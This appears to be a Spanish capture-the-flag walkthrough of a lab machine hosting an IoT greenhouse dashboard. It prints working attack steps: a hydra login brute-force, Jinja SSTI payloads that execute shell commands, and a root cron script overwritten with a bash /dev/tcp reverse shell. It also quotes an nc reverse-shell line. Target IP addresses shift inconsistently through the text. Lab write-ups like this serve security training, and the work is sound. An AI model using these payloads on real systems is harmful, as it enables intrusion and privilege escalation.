Iniciamos el proceso identificando la dirección IP de la maquina objetivo en la red interna, para ello utilizamos:

```bash
arp-scan -I eth0 --localnet
```

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 10.20.2.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.20.2.1       52:54:00:12:35:00       QEMU
10.20.2.2       52:54:00:12:35:00       QEMU
10.20.2.3       08:00:27:3c:f5:38       PCS Systemtechnik GmbH
10.20.2.9       08:00:27:b7:ef:14       PCS Systemtechnik GmbH
```

De esta forma se pueden ver las direcciones IP en la red interna, también se puede observar que la IP de nuestra maquina es 10.20.2.10, vamos a realizar un ping a la IP 10.20.2.9 para analizar su `ttl` y tratar de determinar el sistema operativo.

```bash 
ping -c 1 10.20.2.9 -R
```

```
PING 10.20.2.9 (10.20.2.9) 56(124) bytes of data.
64 bytes from 10.20.2.9: icmp_seq=1 ttl=64 time=0.370 ms
RR:     10.20.2.10
        10.20.2.9
        10.20.2.9
        10.20.2.10

--- 10.20.2.9 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.370/0.370/0.370/0.000 ms
```

Como se puede ver, nos da un `ttl=64`, esto nos indica que podemos estar frente a una distribución de Linux, de acuerdo a lo siguiente:

| Sistema Operativo                        | TTL |
| ---------------------------------------- | --- |
| Windows                                  | 128 |
| Linux / Unix / MacOS                     | 64  |
| Dispositivos de red CISCO / Solaris /AIX | 255 |
Ahora podemos realizar un reconocimiento mas profundo a través de `nmap`, de la siguiente forma:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.20.2.9 -oG allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 16:01 -0400
Initiating ARP Ping Scan at 16:01
Scanning 10.20.2.9 [1 port]
Completed ARP Ping Scan at 16:01, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:01
Scanning 10.20.2.9 [65535 ports]
Discovered open port 22/tcp on 10.20.2.9
Discovered open port 80/tcp on 10.20.2.9
Discovered open port 8080/tcp on 10.20.2.9
Completed SYN Stealth Scan at 16:01, 11.73s elapsed (65535 total ports)
Nmap scan report for 10.20.2.9
Host is up, received arp-response (0.00022s latency).
Scanned at 2026-09-15 16:01:43 EDT for 12s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
MAC Address: 08:00:27:B7:EF:14 (Oracle VirtualBox virtual NIC)
```

Se observa que efectivamente es nuestra maquina objetivo y tiene tres puertos abiertos: `22,80,8080`, lo siguiente será realizar enumeración sobre estos puertos para descubrir servicios y versiones con el siguiente comando:

```bash
nmap -sCV -p 22,80,8080 10.20.2.9 -oN target.txt
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 16:13 -0400
Nmap scan report for 10.20.2.9
Host is up (0.00066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.68 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.68 (Unix)
|_http-title: It works! Apache httpd
8080/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.9.25)
|_http-server-header: Werkzeug/3.1.8 Python/3.9.25
| http-title: IoT Dashboard
|_Requested resource was /login
MAC Address: 08:00:27:B7:EF:14 (Oracle VirtualBox virtual NIC)
```

Vemos que tenemos dos servicios `http` ejecutándose, en el puerto `80` tenemos Apache y en el puerto `8080` tenemos Werkzeug, así mismo en el puerto `22`, encontramos OpenSSH. Podemos iniciar por analizar los servicios web, utilizando `whatweb`, para ver las tecnologías involucradas en cada servicio y una inspección visual por medio del navegador. 

Puerto 80:
```bash
whatweb http://10.20.2.9
```

```
http://10.20.2.9 [200 OK] Apache[2.4.68], Country[RESERVED][ZZ], HTTPServer[Unix][Apache/2.4.68 (Unix)], IP[10.20.2.9], Title[It works! Apache httpd]
```

![[Pasted image 20260916222917.png]]

Puerto 8080:
```bash
whatweb http://10.20.2.9:8080
```

```
http://10.20.2.9:8080 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.8 Python/3.9.25], IP[10.20.2.9], Python[3.9.25], RedirectLocation[/login], Title[Redirecting...], Werkzeug[3.1.8]
http://10.20.2.9:8080/login [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.8 Python/3.9.25], IP[10.20.2.9], Python[3.9.25], Script, Title[IoT Dashboard], Werkzeug[3.1.8]
```

![[Pasted image 20260916223013.png]]

Revisamos las cabeceras con `curl`.

```bash
curl -I http://10.20.2.9:8080/
```

```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.8 Python/3.9.25
Date: Thu, 17 Sep 2026 05:01:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Vary: Cookie
Connection: close
```

Con esto podemos ver que el servidor responde y solicita una Cookie de sesión para autenticar la cuenta, cookie que se genera al ingresar el usuario y contraseña, los cuales si analizamos el codigo de la pagina se pasan mediante un formulario a través del método POST.

![[Pasted image 20260916231408.png]]

En este punto podemos probar con `hydra` para realizar un ataque de fuerza bruta partiendo del supuesto que existe un usuario `admin`, probando con contraseñas comunes, tratando de aprovechar una mala configuración de la cuenta de administrador, para esto creamos un pequeño diccionario con contraseñas comunes, se puede buscar en el navegador las contraseñas mas comunes para el usuario `admin`. para crear el diccionario usamos `cat`.

```bash
cat > passwords.txt <<'EOF'
admin
123456
12345678
1234
Password
123
12345
admin123
123456789
adminisp
EOF
```

```bash
ll
-rw-r--r-- 1 root root  74 Sep 17 01:21 passwords.txt
```

Ahora podemos utilizar `hydra` para realizar el ataque de fuerza bruta.

```bash
hydra -l admin -P passwords.txt -s 8080 10.20.2.3 http-post-form \
"/login:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos." \
-V
```

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

....

[STATUS] 10.00 tries/min, 10 tries in 00:01h, 1 to do in 00:01h, 10 active
[8080][http-post-form] host: 10.20.2.3   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-17 01:28:55
```

En este resumen de la salida de `hydra`, podemos ver que se ha encontrado una coincidencia para el usuario `admin`, con la contraseña `admin123`. Con esto podemos probar en el formulario para tratr de acceder a la cuenta de administrador.

![[Pasted image 20260916233534.png]]

Se comprueba que con las credenciales obtenidas de `hydra` se puede acceder, si se navega en el menú lateral, encontraremos que en la opción de `alertas` se tiene un formulario con una posible vulnerabilidad ya que solicita utilizar variables `jinja` en el envío de la forma `{{ sensor }}`, esto puede permitir aprovechar la vulnerabilidad `SSTI (Server-Side Template Injection)`. Se puede hacer una prueba rápida con:

```jinja
{{ 9*7 }}
```

![[Pasted image 20260916234211.png]]

El código se ejecuta correctamente, así que podemos enumerar directorios y archivos para darnos una idea de donde estamos.

```Jinja
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
```

```
total 104 
drwxr-xr-x 1 operador root 4096 Aug 30 13:43 . 
drwxr-xr-x 1 root root 4096 Aug 30 13:43 .. 
-rwxr-xr-x 1 operador root 31 Aug 30 02:00 .dockerignore 
-rwxr-xr-x 1 operador root 183 Aug 30 13:36 .env 
-rwxr-xr-x 1 operador root 785 Aug 30 02:00 Dockerfile 
-rwxr-xr-x 1 operador root 166 Aug 30 01:56 README.txt 
drwxr-xr-x 2 operador nogroup 4096 Aug 30 13:43 __pycache__ 
drwxr-xr-x 1 operador root 4096 Aug 30 04:43 api 
-rwxr-xr-x 1 operador root 4009 Aug 30 04:02 app.py 
-rwxr-xr-x 1 operador root 563 Aug 28 03:06 config.py 
-rwxr-xr-x 1 operador root 58 Aug 28 03:06 extensions.py 
-rwxr-xr-x 1 operador root 9012 Aug 28 03:06 init.py 
drwxrwxrwx 1 operador root 4096 Sep 17 05:41 instance 
drwxr-xr-x 1 operador root 4096 Aug 30 04:43 invernadero 
-rwxr-xr-x 1 operador root 1550 Aug 28 03:06 models.py 
-rwxr-xr-x 1 operador root 84 Aug 30 04:15 requirements.txt 
-rwxr-xr-x 1 operador root 11251 Aug 30 04:09 routes.py 
drwxr-xr-x 1 operador root 4096 Aug 30 04:43 static 
drwxr-xr-x 1 operador root 4096 Aug 30 04:43 templates 
-rwxr-xr-x 1 operador root 26 Aug 30 13:41 user.txt
```

En esta salida se pueden observar archivos interesantes como: `app.py`, `config.py`, `init.py`, `.env`. Podemos iniciar por revisar el primero.

```jinja
{{ cycler.__init__.__globals__.os.popen('cat /app/app.py').read() }}
```

De esta salida interesa particularmente el siguiente apartado, donde se exponen credenciales en texto plano, si recapitulamos, en los servicios que se encontraron con `nmap` estaba activo el servicio `ssh`, podemos intentar con estas credenciales para tratar de obtener acceso vía remota.

```
cliente = mqtt.Client() 
usuario = app.config.get("MQTT_USER", "admin_invernadero") 
password = app.config.get("MQTT_PASSWORD", "admin_invernadero123") 
broker = app.config.get("MQTT_BROKER", "172.17.0.1")
```

```bash
ssh admin_invernadero@10.20.2.3
```

```
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

server1:~% 
```

Se ha obtenido el acceso de forma exitosa, ahora hay que ejecutar algunos comandos para verificar el usuario, que permisos tiene, la ruta a la que accedimos y si no es usuario root, buscar la forma de escalar privilegios.

```bash
server1:~% whoami
admin_invernadero
```

```bash
server1:~% id
uid=1002(admin_invernadero) gid=1002(admin_invernadero) groups=1002(admin_invernadero)
```

De acuerdo a su `id`, el usuario no es administrador, por lo que se tendrá que buscar la escalada de privilegios.

```bash
server1:~% pwd
/home/admin_invernadero
```

```bash
erver1:~% ls -la
total 20
drwxr-sr-x    2 admin_invernadero admin_invernadero      4096 Aug 29 23:12 .
drwxr-xr-x    3 root     root          4096 Aug 29 23:28 ..
-rw-------    1 admin_invernadero admin_invernadero      1082 Aug 29 23:12 .ash_history
-rw-------    1 admin_invernadero admin_invernadero      1399 Aug 29 23:12 .bash_history
-rw-r--r--    1 admin_invernadero admin_invernadero        35 Aug 29 22:25 user.txt

```

Encontramos aquí algo interesante, tres archivos, dos ocultos, el historial de la terminal: `.bash_hitory`, otro muy sospechoso al que parece ser, le modificaron el nombre `.ash_history`, y un tercero `user.txt`, puede ser una de las ==banderas (`flag`)== que estamos buscando.

Antes de revisar los archivos encontrados podemos ver comandos con permisos SUID para ver si hay alguno que se pueda ejecutar como `root` y secuestrarlo para una escalada de privilegios.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chage
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/doas
/usr/bin/expiry
/usr/bin/gpasswd
/usr/local/bin/find
/usr/sbin/suexec
/bin/bbsuid
```

De este listado puede ser interesante el comando find en la ruta `/usr/local/bin`, sin embargo, antes de continuar por esta vía, podemos revisar lo que hay en el archivo oculto `.ash_history`, ya que el nombre del archivo por si solo parece sospechoso.

```bash
cat .ash_history
```

Al analizar el contenido parece ser un volcado de historial de `bash`, sin embargo si ponemos atención en algunas secciones se encuentra algo interesante.

```
...
bash -p
...
echo '#!/bin/sh
nc 192.168.1.19 4443 -e /bin/sh
' > /opt/invernadero/backup_logs.sh
echo '#!/bin/sh
cat /root/flag.txt > /tmp/flag_leaked.txt
chmod 644 /tmp/flag_leaked.txt
' > /opt/invernadero/backup_logs.sh
...
echo '#!/bin/sh
cat /root/flag.txt > /tmp/flag_leaked.txt
chmod 644 /tmp/flag_leaked.txt
cat /root/* > /tmp/flag_leaked.txt
chmod 644 /tmp/flag_leaked.txt
...
echo '#!/bin/sh
mkdir -p /tmp/root_backup
cp -r /root/* /tmp/root_backup/
chmod -R 644 /tmp/root_backup
' > /opt/invernadero/backup_logs.sh
...
```

Primero vemos que se ejecuta la `shell` con permisos de super usuario, y en las otras secciones podemos ver que se modifica un archivo en distintas ocasiones, `backup_logs.sh`, para ejecutar distintas instrucciones como usuario `root`. Vale la pena analizar ese archivo. 

```bash
cd /opt/invernadero/
cat backup_logs.sh
```

```
#!/bin/sh 
# Sistema de respaldo automático de logs MQTT 
# Ejecutado cada minuto por cron (root) 

LOGDIR="/var/log/mqtt" 
BACKUPDIR="/var/backups/mqtt" 
TIMESTAMP=$(date +%Y%m%d_%H%M%S) 

mkdir -p "$BACKUPDIR" 
tar -czf "$BACKUPDIR/logs_$TIMESTAMP.tar.gz" 
"$LOGDIR" 2>/dev/null 
echo "Backup ejecutado en $TIMESTAMP" >> /var/log/invernadero_backup.log
```

Hemos encontrado la ruta segura hacia la escalada de privilegios, este script se ejecuta cada minuto con privilegios de super usuario por `cron`, solo tenemos que verificar que al usuario `admin_invernadero` puede escribir en el.

```bash
ls -l /opt/invernadero/backup_logs.sh
```

```bash
-rwxrwxr-x  1 rootadmin_invernadero 68 Sep 15 00:36 /opt/invernadero/backup_logs.sh
```

Con esto confirmamos que con el usuario actual podemos escribir en `backup_logs.sh`, así que lo modificaremos para obtener una `shell inversa` en otra terminal. Primero en una nueva terminal preparamos un `listener` con `nc`.

```bash
nc -lvnp 4443
```

Ahora modificamos el script para obtener la `shell inversa`.

```bash
cat > /opt/invernadero/backup_logs.sh <<'EOF' 
#!/bin/sh 
/bin/bash -c 'bash -i >& /dev/tcp/10.20.2.4/4443 0>&1' 
EOF
```

Ahora verificamos que se haya escrito correctamente.

```bash
cat backup_logs.sh
```

```
#!/bin/sh
/bin/bash -c 'bash -i >& /dev/tcp/10.20.2.4/4443 0>&1'
```

Una vez modificado debemos esperar unos segundos, ya que si recordamos el script se ejecuta cada minuto. Si todo salió bien en la terminal del `listener` obtendremos una sesión de `root`.

```
listening on [any] 4443 ...
connect to [10.20.2.4] from (UNKNOWN) [10.20.2.3] 41808
bash: cannot set terminal process group (4291): Not a tty
bash: no job control in this shell
server1:~# 
```

Podemos comprobar

```bash
server1:~# id
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

```bash
server1:~# whoami
whoami
root
```

```bash
server1:~# hostname
hostname
server1
```

Finalmente listamos el contenido del directorio actual.

```bash
server1:~# ls -la
ls -la
total 40
drwx------    5 root     root          4096 Aug 29 21:36 .
drwxr-xr-x   21 root     root          4096 Aug  9 19:41 ..
-rw-------    1 root     root          2040 Aug  9 21:00 .ash_history
-rw-------    1 root     root            93 Aug 10 11:39 .bash_history
drwxr-xr-x    3 root     root          4096 Aug  9 20:23 .config
drwx------    3 root     root          4096 Aug 29 21:10 .docker
drwx------    2 root     root          4096 Aug 10 11:38 .ssh
-rw-r--r--    1 root     root          1042 Aug  9 20:39 .zshrc
-rw-r--r--    1 root     root           413 Aug  9 20:18 index.html
-rw-------    1 root     root            36 Aug 29 22:26 root.txt
```

Valdría la pena revisar `root.txt`, quizá sea la segunda ==bandera (`flag`)== que estamos buscando.